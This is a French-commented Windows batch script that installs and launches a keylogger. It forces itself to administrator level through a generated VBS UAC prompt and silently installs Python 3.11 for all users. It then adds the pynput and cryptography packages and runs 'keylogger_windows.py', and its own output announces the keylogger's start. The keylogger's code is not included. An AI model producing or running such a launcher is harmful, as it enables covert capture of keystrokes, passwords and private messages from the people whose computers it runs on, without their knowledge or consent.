@echo off
title INSTALLATION FORCEE (MODE ADMIN)
color 0B

:: ========================================================
:: 1. AUTO-ELEVATION EN ADMINISTRATEUR
:: ========================================================
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [INFO] Demande de privileges Administrateur...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

echo ========================================================
echo      INSTALLATION DE PYTHON (METHODE DIRECTE)
echo ========================================================
echo.

:: ========================================================
:: 2. TELECHARGEMENT ET INSTALLATION PYTHON
:: ========================================================
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ACTION] Telechargement de Python 3.11 (env. 25 Mo)...
    
    :: Lien direct vers l'installateur (Fonctionne sur x64 et ARM via emulation)
    curl -o python_installer.exe https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
    
    echo.
    echo [ACTION] Installation silencieuse en cours...
    echo [INFO] Cela peut prendre 1 a 2 minutes.
    
    :: Installation silencieuse avec ajout au PATH
    python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    :: Nettoyage
    del python_installer.exe
    
    echo.
    echo [SUCCES] Python installe.
    echo.
    echo [IMPORTANT] Pour que Windows prenne en compte Python, 
    echo il est souvent necessaire de fermer et relancer ce script.
    echo.
    echo Tentative d'utilisation immediate...
)

:: ========================================================
:: 3. DEPENDANCES ET LANCEMENT
:: ========================================================

:: On essaie d'utiliser le nouveau Python directement via son chemin par défaut
set PY_PATH="C:\Program Files\Python311\python.exe"

if exist %PY_PATH% (
    echo [INFO] Utilisation du chemin direct : %PY_PATH%
    %PY_PATH% -m pip install pynput cryptography
    echo.
    echo [LANCEMENT] Demarrage du Keylogger...
    %PY_PATH% keylogger_windows.py
) else (
    :: Si le chemin n'est pas standard, on essaie la commande globale (peut échouer sans redémarrage)
    pip install pynput cryptography
    python keylogger_windows.py
)

pause
